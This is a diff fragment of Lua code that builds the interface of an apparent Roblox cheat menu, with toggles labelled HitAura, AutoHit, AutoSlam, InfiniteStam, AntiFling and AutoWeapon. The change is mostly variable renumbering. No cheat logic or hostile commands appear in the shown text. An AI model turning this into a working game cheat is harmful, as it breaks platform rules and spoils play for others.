-TextLabel_5.Parent = TextLabel_4
-TextLabel_5.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_5.BackgroundTransparency = 1
-TextLabel_5.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_5.Position = UDim2.new(0.0248226952, 0, 0, 0)
-TextLabel_5.Size = UDim2.new(0, 72, 0, 27)
-TextLabel_5.Font = Enum.Font.SourceSans
-TextLabel_5.Text = "HitAura"
-TextLabel_5.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_5.TextSize = 14
-TextLabel_5.TextStrokeTransparency = 0
-TextLabel_5.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_7.Parent = TextLabel_6
+TextLabel_7.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_7.BackgroundTransparency = 1
+TextLabel_7.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_7.Position = UDim2.new(0.0248226952, 0, 0, 0)
+TextLabel_7.Size = UDim2.new(0, 72, 0, 27)
+TextLabel_7.Font = Enum.Font.SourceSans
+TextLabel_7.Text = "HitAura"
+TextLabel_7.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_7.TextSize = 14
+TextLabel_7.TextStrokeTransparency = 0
+TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_3.Name = "WipButton"
-WipButton_3.Parent = TextLabel_4
+WipButton_3.Parent = TextLabel_6
 WipButton_3.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_3.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_3.Position = UDim2.new(0.904255271, 0, 0.493055552, 0)
@@ -543,11 +614,11 @@ WipButton_3.Text = ""
 WipButton_3.TextColor3 = Color3.new(0, 0, 0)
 WipButton_3.TextSize = 14
 
-UICorner_7.Parent = WipButton_3
-UICorner_7.CornerRadius = UDim.new(0, 2)
+UICorner_8.Parent = WipButton_3
+UICorner_8.CornerRadius = UDim.new(0, 2)
 
 mainFrame_2.Name = "mainFrame"
-mainFrame_2.Parent = TextLabel_4
+mainFrame_2.Parent = TextLabel_6
 mainFrame_2.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame_2.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
 mainFrame_2.BackgroundTransparency = 1
@@ -590,8 +661,8 @@ amountValue_2.TextSize = 15
 amountValue_2.TextStrokeTransparency = 0
 amountValue_2.TextWrapped = true
 
-UICorner_8.Parent = bSliderFrame_2
-UICorner_8.CornerRadius = UDim.new(0, 2)
+UICorner_9.Parent = bSliderFrame_2
+UICorner_9.CornerRadius = UDim.new(0, 2)
 
 UIAspectRatioConstraint_2.Parent = mainFrame_2
 UIAspectRatioConstraint_2.AspectRatio = 2.009615421295166
@@ -619,8 +690,8 @@ WipButton_4.Text = ""
 WipButton_4.TextColor3 = Color3.new(0, 0, 0)
 WipButton_4.TextSize = 14
 
-UICorner_9.Parent = WipButton_4
-UICorner_9.CornerRadius = UDim.new(0, 2)
+UICorner_10.Parent = WipButton_4
+UICorner_10.CornerRadius = UDim.new(0, 2)
 
 TargetBox.Name = "TargetBox"
 TargetBox.Parent = TargetHit
@@ -634,36 +705,36 @@ TargetBox.Text = ""
 TargetBox.TextColor3 = Color3.new(1, 1, 1)
 TargetBox.TextSize = 14
 
-UICorner_10.Parent = TargetBox
-UICorner_10.CornerRadius = UDim.new(0, 2)
+UICorner_11.Parent = TargetBox
+UICorner_11.CornerRadius = UDim.new(0, 2)
 
-TextLabel_6.Parent = TabFrame2
-TextLabel_6.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_6.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_6.Position = UDim2.new(0.0227974523, 0, 0.543271959, 0)
-TextLabel_6.Size = UDim2.new(0, 282, 0, 48)
-TextLabel_6.Font = Enum.Font.SourceSans
-TextLabel_6.Text = ""
-TextLabel_6.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_6.TextSize = 14
-TextLabel_6.TextStrokeTransparency = 0
-TextLabel_6.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_8.Parent = TabFrame2
+TextLabel_8.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_8.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_8.Position = UDim2.new(0.0227974523, 0, 0.543271959, 0)
+TextLabel_8.Size = UDim2.new(0, 282, 0, 48)
+TextLabel_8.Font = Enum.Font.SourceSans
+TextLabel_8.Text = ""
+TextLabel_8.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_8.TextSize = 14
+TextLabel_8.TextStrokeTransparency = 0
+TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left
 
-TextLabel_7.Parent = TextLabel_6
-TextLabel_7.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_7.BackgroundTransparency = 1
-TextLabel_7.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_7.Position = UDim2.new(0.0248226952, 0, 0, 0)
-TextLabel_7.Size = UDim2.new(0, 72, 0, 27)
-TextLabel_7.Font = Enum.Font.SourceSans
-TextLabel_7.Text = "AutoHit"
-TextLabel_7.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_7.TextSize = 14
-TextLabel_7.TextStrokeTransparency = 0
-TextLabel_7.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_9.Parent = TextLabel_8
+TextLabel_9.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_9.BackgroundTransparency = 1
+TextLabel_9.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_9.Position = UDim2.new(0.0248226952, 0, 0, 0)
+TextLabel_9.Size = UDim2.new(0, 72, 0, 27)
+TextLabel_9.Font = Enum.Font.SourceSans
+TextLabel_9.Text = "AutoHit"
+TextLabel_9.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_9.TextSize = 14
+TextLabel_9.TextStrokeTransparency = 0
+TextLabel_9.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_5.Name = "WipButton"
-WipButton_5.Parent = TextLabel_6
+WipButton_5.Parent = TextLabel_8
 WipButton_5.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_5.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_5.Position = UDim2.new(0.904255271, 0, 0.493055552, 0)
@@ -673,11 +744,11 @@ WipButton_5.Text = ""
 WipButton_5.TextColor3 = Color3.new(0, 0, 0)
 WipButton_5.TextSize = 14
 
-UICorner_11.Parent = WipButton_5
-UICorner_11.CornerRadius = UDim.new(0, 2)
+UICorner_12.Parent = WipButton_5
+UICorner_12.CornerRadius = UDim.new(0, 2)
 
 mainFrame_3.Name = "mainFrame"
-mainFrame_3.Parent = TextLabel_6
+mainFrame_3.Parent = TextLabel_8
 mainFrame_3.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame_3.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
 mainFrame_3.BackgroundTransparency = 1
@@ -719,39 +790,39 @@ amountValue_3.TextSize = 15
 amountValue_3.TextStrokeTransparency = 0
 amountValue_3.TextWrapped = true
 
-UICorner_12.Parent = bSliderFrame_3
-UICorner_12.CornerRadius = UDim.new(0, 2)
+UICorner_13.Parent = bSliderFrame_3
+UICorner_13.CornerRadius = UDim.new(0, 2)
 
 UIAspectRatioConstraint_3.Parent = mainFrame_3
 UIAspectRatioConstraint_3.AspectRatio = 2.009615421295166
 
-TextLabel_8.Parent = TabFrame2
-TextLabel_8.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_8.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_8.Position = UDim2.new(0.0227974523, 0, 0.686231494, 0)
-TextLabel_8.Size = UDim2.new(0, 282, 0, 48)
-TextLabel_8.Font = Enum.Font.SourceSans
-TextLabel_8.Text = ""
-TextLabel_8.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_8.TextSize = 14
-TextLabel_8.TextStrokeTransparency = 0
-TextLabel_8.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_10.Parent = TabFrame2
+TextLabel_10.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_10.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_10.Position = UDim2.new(0.0227974523, 0, 0.686231494, 0)
+TextLabel_10.Size = UDim2.new(0, 282, 0, 48)
+TextLabel_10.Font = Enum.Font.SourceSans
+TextLabel_10.Text = ""
+TextLabel_10.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_10.TextSize = 14
+TextLabel_10.TextStrokeTransparency = 0
+TextLabel_10.TextXAlignment = Enum.TextXAlignment.Left
 
-TextLabel_9.Parent = TextLabel_8
-TextLabel_9.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_9.BackgroundTransparency = 1
-TextLabel_9.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_9.Position = UDim2.new(0.0248226952, 0, 0, 0)
-TextLabel_9.Size = UDim2.new(0, 72, 0, 27)
-TextLabel_9.Font = Enum.Font.SourceSans
-TextLabel_9.Text = "AutoHeavy"
-TextLabel_9.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_9.TextSize = 14
-TextLabel_9.TextStrokeTransparency = 0
-TextLabel_9.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_11.Parent = TextLabel_10
+TextLabel_11.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_11.BackgroundTransparency = 1
+TextLabel_11.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_11.Position = UDim2.new(0.0248226952, 0, 0, 0)
+TextLabel_11.Size = UDim2.new(0, 72, 0, 27)
+TextLabel_11.Font = Enum.Font.SourceSans
+TextLabel_11.Text = "AutoHeavy"
+TextLabel_11.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_11.TextSize = 14
+TextLabel_11.TextStrokeTransparency = 0
+TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_6.Name = "WipButton"
-WipButton_6.Parent = TextLabel_8
+WipButton_6.Parent = TextLabel_10
 WipButton_6.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_6.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_6.Position = UDim2.new(0.904255271, 0, 0.493055552, 0)
@@ -761,11 +832,11 @@ WipButton_6.Text = ""
 WipButton_6.TextColor3 = Color3.new(0, 0, 0)
 WipButton_6.TextSize = 14
 
-UICorner_13.Parent = WipButton_6
-UICorner_13.CornerRadius = UDim.new(0, 2)
+UICorner_14.Parent = WipButton_6
+UICorner_14.CornerRadius = UDim.new(0, 2)
 
 mainFrame_4.Name = "mainFrame"
-mainFrame_4.Parent = TextLabel_8
+mainFrame_4.Parent = TextLabel_10
 mainFrame_4.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame_4.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
 mainFrame_4.BackgroundTransparency = 1
@@ -808,39 +879,39 @@ amountValue_4.TextSize = 15
 amountValue_4.TextStrokeTransparency = 0
 amountValue_4.TextWrapped = true
 
-UICorner_14.Parent = bSliderFrame_4
-UICorner_14.CornerRadius = UDim.new(0, 2)
+UICorner_15.Parent = bSliderFrame_4
+UICorner_15.CornerRadius = UDim.new(0, 2)
 
 UIAspectRatioConstraint_4.Parent = mainFrame_4
 UIAspectRatioConstraint_4.AspectRatio = 2.009615421295166
 
-TextLabel_10.Parent = TabFrame2
-TextLabel_10.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_10.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_10.Position = UDim2.new(0.0227974523, 0, 0.429528296, 0)
-TextLabel_10.Size = UDim2.new(0, 282, 0, 48)
-TextLabel_10.Font = Enum.Font.SourceSans
-TextLabel_10.Text = ""
-TextLabel_10.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_10.TextSize = 14
-TextLabel_10.TextStrokeTransparency = 0
-TextLabel_10.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_12.Parent = TabFrame2
+TextLabel_12.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_12.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_12.Position = UDim2.new(0.0227974523, 0, 0.429528296, 0)
+TextLabel_12.Size = UDim2.new(0, 282, 0, 48)
+TextLabel_12.Font = Enum.Font.SourceSans
+TextLabel_12.Text = ""
+TextLabel_12.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_12.TextSize = 14
+TextLabel_12.TextStrokeTransparency = 0
+TextLabel_12.TextXAlignment = Enum.TextXAlignment.Left
 
-TextLabel_11.Parent = TextLabel_10
-TextLabel_11.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_11.BackgroundTransparency = 1
-TextLabel_11.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_11.Position = UDim2.new(0.0248226952, 0, 0, 0)
-TextLabel_11.Size = UDim2.new(0, 72, 0, 27)
-TextLabel_11.Font = Enum.Font.SourceSans
-TextLabel_11.Text = "AutoSlam"
-TextLabel_11.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_11.TextSize = 14
-TextLabel_11.TextStrokeTransparency = 0
-TextLabel_11.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_13.Parent = TextLabel_12
+TextLabel_13.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_13.BackgroundTransparency = 1
+TextLabel_13.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_13.Position = UDim2.new(0.0248226952, 0, 0, 0)
+TextLabel_13.Size = UDim2.new(0, 72, 0, 27)
+TextLabel_13.Font = Enum.Font.SourceSans
+TextLabel_13.Text = "AutoSlam"
+TextLabel_13.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_13.TextSize = 14
+TextLabel_13.TextStrokeTransparency = 0
+TextLabel_13.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_7.Name = "WipButton"
-WipButton_7.Parent = TextLabel_10
+WipButton_7.Parent = TextLabel_12
 WipButton_7.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_7.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_7.Position = UDim2.new(0.904255271, 0, 0.493055552, 0)
@@ -850,11 +921,11 @@ WipButton_7.Text = ""
 WipButton_7.TextColor3 = Color3.new(0, 0, 0)
 WipButton_7.TextSize = 14
 
-UICorner_15.Parent = WipButton_7
-UICorner_15.CornerRadius = UDim.new(0, 2)
+UICorner_16.Parent = WipButton_7
+UICorner_16.CornerRadius = UDim.new(0, 2)
 
 mainFrame_5.Name = "mainFrame"
-mainFrame_5.Parent = TextLabel_10
+mainFrame_5.Parent = TextLabel_12
 mainFrame_5.AnchorPoint = Vector2.new(0.5, 0.5)
 mainFrame_5.BackgroundColor3 = Color3.new(0.137255, 0.137255, 0.137255)
 mainFrame_5.BackgroundTransparency = 1
@@ -897,8 +968,8 @@ amountValue_5.TextSize = 15
 amountValue_5.TextStrokeTransparency = 0
 amountValue_5.TextWrapped = true
 
-UICorner_16.Parent = bSliderFrame_5
-UICorner_16.CornerRadius = UDim.new(0, 2)
+UICorner_17.Parent = bSliderFrame_5
+UICorner_17.CornerRadius = UDim.new(0, 2)
 
 UIAspectRatioConstraint_5.Parent = mainFrame_5
 UIAspectRatioConstraint_5.AspectRatio = 2.009615421295166
@@ -926,8 +997,8 @@ WipButton_8.Text = ""
 WipButton_8.TextColor3 = Color3.new(0, 0, 0)
 WipButton_8.TextSize = 14
 
-UICorner_17.Parent = WipButton_8
-UICorner_17.CornerRadius = UDim.new(0, 2)
+UICorner_18.Parent = WipButton_8
+UICorner_18.CornerRadius = UDim.new(0, 2)
 
 TargetBox_2.Name = "TargetBox"
 TargetBox_2.Parent = FarmTarget
@@ -941,8 +1012,8 @@ TargetBox_2.Text = ""
 TargetBox_2.TextColor3 = Color3.new(1, 1, 1)
 TargetBox_2.TextSize = 14
 
-UICorner_18.Parent = TargetBox_2
-UICorner_18.CornerRadius = UDim.new(0, 2)
+UICorner_19.Parent = TargetBox_2
+UICorner_19.CornerRadius = UDim.new(0, 2)
 
 Folder.Parent = TabFrame2
 
@@ -958,17 +1029,17 @@ TextButton.Text = ">"
 TextButton.TextColor3 = Color3.new(1, 1, 1)
 TextButton.TextSize = 14
 
-TextLabel_12.Parent = Folder
-TextLabel_12.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_12.BackgroundTransparency = 1
-TextLabel_12.BorderColor3 = Color3.new(0, 0, 0)
-TextLabel_12.BorderSizePixel = 0
-TextLabel_12.Position = UDim2.new(0.619528592, 0, 0.926391065, 0)
-TextLabel_12.Size = UDim2.new(0, 77, 0, 9)
-TextLabel_12.Font = Enum.Font.SourceSans
-TextLabel_12.Text = "Page 1"
-TextLabel_12.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_12.TextSize = 14
+TextLabel_14.Parent = Folder
+TextLabel_14.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_14.BackgroundTransparency = 1
+TextLabel_14.BorderColor3 = Color3.new(0, 0, 0)
+TextLabel_14.BorderSizePixel = 0
+TextLabel_14.Position = UDim2.new(0.619528592, 0, 0.926391065, 0)
+TextLabel_14.Size = UDim2.new(0, 77, 0, 9)
+TextLabel_14.Font = Enum.Font.SourceSans
+TextLabel_14.Text = "Page 1"
+TextLabel_14.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_14.TextSize = 14
 
 SecondPage.Name = "SecondPage"
 SecondPage.Parent = Container
@@ -1004,8 +1075,8 @@ WipButton_9.Text = ""
 WipButton_9.TextColor3 = Color3.new(0, 0, 0)
 WipButton_9.TextSize = 14
 
-UICorner_19.Parent = WipButton_9
-UICorner_19.CornerRadius = UDim.new(0, 2)
+UICorner_20.Parent = WipButton_9
+UICorner_20.CornerRadius = UDim.new(0, 2)
 
 Folder_2.Parent = SecondPage
 
@@ -1022,31 +1093,31 @@ TextButton_2.TextColor3 = Color3.new(1, 1, 1)
 TextButton_2.TextSize = 19
 TextButton_2.TextWrapped = true
 
-TextLabel_13.Parent = Folder_2
-TextLabel_13.BackgroundColor3 = Color3.new(1, 1, 1)
-TextLabel_13.BackgroundTransparency = 1
-TextLabel_13.BorderColor3 = Color3.new(0, 0, 0)
-TextLabel_13.BorderSizePixel = 0
-TextLabel_13.Position = UDim2.new(0.824915826, 0, 0.304418743, 0)
-TextLabel_13.Size = UDim2.new(0, 59, 0, 11)
-TextLabel_13.Font = Enum.Font.SourceSans
-TextLabel_13.Text = "Page 2"
-TextLabel_13.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_13.TextSize = 14
+TextLabel_15.Parent = Folder_2
+TextLabel_15.BackgroundColor3 = Color3.new(1, 1, 1)
+TextLabel_15.BackgroundTransparency = 1
+TextLabel_15.BorderColor3 = Color3.new(0, 0, 0)
+TextLabel_15.BorderSizePixel = 0
+TextLabel_15.Position = UDim2.new(0.824915826, 0, 0.304418743, 0)
+TextLabel_15.Size = UDim2.new(0, 59, 0, 11)
+TextLabel_15.Font = Enum.Font.SourceSans
+TextLabel_15.Text = "Page 2"
+TextLabel_15.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_15.TextSize = 14
 
-TextLabel_14.Parent = SecondPage
-TextLabel_14.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_14.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_14.Position = UDim2.new(0.0525316447, 0, 0.107725993, 0)
-TextLabel_14.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_14.Font = Enum.Font.SourceSans
-TextLabel_14.Text = "AutoWeapon (BEST)"
-TextLabel_14.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_14.TextSize = 14
-TextLabel_14.TextStrokeTransparency = 0
-TextLabel_14.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_16.Parent = SecondPage
+TextLabel_16.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_16.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_16.Position = UDim2.new(0.0525316447, 0, 0.107725993, 0)
+TextLabel_16.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_16.Font = Enum.Font.SourceSans
+TextLabel_16.Text = "AutoWeapon (BEST)"
+TextLabel_16.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_16.TextSize = 14
+TextLabel_16.TextStrokeTransparency = 0
+TextLabel_16.TextXAlignment = Enum.TextXAlignment.Left
 
-TextButton_3.Parent = TextLabel_14
+TextButton_3.Parent = TextLabel_16
 TextButton_3.BackgroundColor3 = Color3.new(1, 0, 0)
 TextButton_3.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 TextButton_3.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1056,22 +1127,22 @@ TextButton_3.Text = ""
 TextButton_3.TextColor3 = Color3.new(0, 0, 0)
 TextButton_3.TextSize = 14
 
-UICorner_20.Parent = TextButton_3
-UICorner_20.CornerRadius = UDim.new(0, 2)
+UICorner_21.Parent = TextButton_3
+UICorner_21.CornerRadius = UDim.new(0, 2)
 
-TextLabel_15.Parent = SecondPage
-TextLabel_15.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_15.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_15.Position = UDim2.new(0.0525316447, 0, 0.183126003, 0)
-TextLabel_15.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_15.Font = Enum.Font.SourceSans
-TextLabel_15.Text = "AutoSpin"
-TextLabel_15.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_15.TextSize = 14
-TextLabel_15.TextStrokeTransparency = 0
-TextLabel_15.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_17.Parent = SecondPage
+TextLabel_17.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_17.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_17.Position = UDim2.new(0.0525316447, 0, 0.183126003, 0)
+TextLabel_17.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_17.Font = Enum.Font.SourceSans
+TextLabel_17.Text = "AutoSpin"
+TextLabel_17.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_17.TextSize = 14
+TextLabel_17.TextStrokeTransparency = 0
+TextLabel_17.TextXAlignment = Enum.TextXAlignment.Left
 
-TextButton_4.Parent = TextLabel_15
+TextButton_4.Parent = TextLabel_17
 TextButton_4.BackgroundColor3 = Color3.new(1, 0, 0)
 TextButton_4.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 TextButton_4.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1081,8 +1152,8 @@ TextButton_4.Text = ""
 TextButton_4.TextColor3 = Color3.new(0, 0, 0)
 TextButton_4.TextSize = 14
 
-UICorner_21.Parent = TextButton_4
-UICorner_21.CornerRadius = UDim.new(0, 2)
+UICorner_22.Parent = TextButton_4
+UICorner_22.CornerRadius = UDim.new(0, 2)
 
 TabFrame1.Name = "TabFrame1"
 TabFrame1.Parent = Container
@@ -1092,22 +1163,23 @@ TabFrame1.BackgroundTransparency = 1
 TabFrame1.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 TabFrame1.Position = UDim2.new(0.292551666, 0, -0.0138248848, 0)
 TabFrame1.Size = UDim2.new(0, 297, 0, 225)
+TabFrame1.Visible = false
 TabFrame1.ScrollBarThickness = 0
 
-TextLabel_16.Parent = TabFrame1
-TextLabel_16.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_16.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_16.Position = UDim2.new(0.0227975063, 0, 0.0933870822, 0)
-TextLabel_16.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_16.Font = Enum.Font.SourceSans
-TextLabel_16.Text = "AntiFall"
-TextLabel_16.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_16.TextSize = 14
-TextLabel_16.TextStrokeTransparency = 0
-TextLabel_16.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_18.Parent = TabFrame1
+TextLabel_18.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_18.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_18.Position = UDim2.new(0.0227975063, 0, 0.0933870822, 0)
+TextLabel_18.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_18.Font = Enum.Font.SourceSans
+TextLabel_18.Text = "AntiFall"
+TextLabel_18.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_18.TextSize = 14
+TextLabel_18.TextStrokeTransparency = 0
+TextLabel_18.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_10.Name = "WipButton"
-WipButton_10.Parent = TextLabel_16
+WipButton_10.Parent = TextLabel_18
 WipButton_10.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_10.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_10.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1117,22 +1189,22 @@ WipButton_10.Text = ""
 WipButton_10.TextColor3 = Color3.new(0, 0, 0)
 WipButton_10.TextSize = 14
 
-UICorner_22.Parent = WipButton_10
-UICorner_22.CornerRadius = UDim.new(0, 2)
+UICorner_23.Parent = WipButton_10
+UICorner_23.CornerRadius = UDim.new(0, 2)
 
-TextLabel_17.Parent = TabFrame1
-TextLabel_17.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_17.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_17.Position = UDim2.new(0.0255956054, 0, 0.0150460843, 0)
-TextLabel_17.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_17.Font = Enum.Font.SourceSans
-TextLabel_17.Text = "InfiniteStam"
-TextLabel_17.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_17.TextSize = 14
-TextLabel_17.TextStrokeTransparency = 0
-TextLabel_17.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_19.Parent = TabFrame1
+TextLabel_19.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_19.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_19.Position = UDim2.new(0.0255956054, 0, 0.0150460843, 0)
+TextLabel_19.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_19.Font = Enum.Font.SourceSans
+TextLabel_19.Text = "InfiniteStam"
+TextLabel_19.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_19.TextSize = 14
+TextLabel_19.TextStrokeTransparency = 0
+TextLabel_19.TextXAlignment = Enum.TextXAlignment.Left
 
-TextButton_5.Parent = TextLabel_17
+TextButton_5.Parent = TextLabel_19
 TextButton_5.BackgroundColor3 = Color3.new(1, 0, 0)
 TextButton_5.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 TextButton_5.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1142,23 +1214,23 @@ TextButton_5.Text = ""
 TextButton_5.TextColor3 = Color3.new(0, 0, 0)
 TextButton_5.TextSize = 14
 
-UICorner_23.Parent = TextButton_5
-UICorner_23.CornerRadius = UDim.new(0, 2)
+UICorner_24.Parent = TextButton_5
+UICorner_24.CornerRadius = UDim.new(0, 2)
 
-TextLabel_18.Parent = TabFrame1
-TextLabel_18.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
-TextLabel_18.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
-TextLabel_18.Position = UDim2.new(0.0240000002, 0, 0.173999995, 0)
-TextLabel_18.Size = UDim2.new(0, 282, 0, 27)
-TextLabel_18.Font = Enum.Font.SourceSans
-TextLabel_18.Text = "AntiFling"
-TextLabel_18.TextColor3 = Color3.new(1, 1, 1)
-TextLabel_18.TextSize = 14
-TextLabel_18.TextStrokeTransparency = 0
-TextLabel_18.TextXAlignment = Enum.TextXAlignment.Left
+TextLabel_20.Parent = TabFrame1
+TextLabel_20.BackgroundColor3 = Color3.new(0.117647, 0.117647, 0.117647)
+TextLabel_20.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
+TextLabel_20.Position = UDim2.new(0.0240000002, 0, 0.173999995, 0)
+TextLabel_20.Size = UDim2.new(0, 282, 0, 27)
+TextLabel_20.Font = Enum.Font.SourceSans
+TextLabel_20.Text = "AntiFling"
+TextLabel_20.TextColor3 = Color3.new(1, 1, 1)
+TextLabel_20.TextSize = 14
+TextLabel_20.TextStrokeTransparency = 0
+TextLabel_20.TextXAlignment = Enum.TextXAlignment.Left
 
 WipButton_11.Name = "WipButton"
-WipButton_11.Parent = TextLabel_18
+WipButton_11.Parent = TextLabel_20
 WipButton_11.BackgroundColor3 = Color3.new(1, 0, 0)
 WipButton_11.BorderColor3 = Color3.new(0.105882, 0.164706, 0.207843)
 WipButton_11.Position = UDim2.new(0.90780139, 0, 0.222222224, 0)
@@ -1168,23 +1240,23 @@ WipButton_11.Text = ""
 WipButton_11.TextColor3 = Color3.new(0, 0, 0)
 WipButton_11.TextSize = 14
 
-UICorner_24.Parent = WipButton_11
-UICorner_24.CornerRadius = UDim.new(0, 2)
+UICorner_25.Parent = WipButton_11
+UICorner_25.CornerRadius = UDim.new(0, 2)
 
-TextLabel_19.Parent = TabFrame1
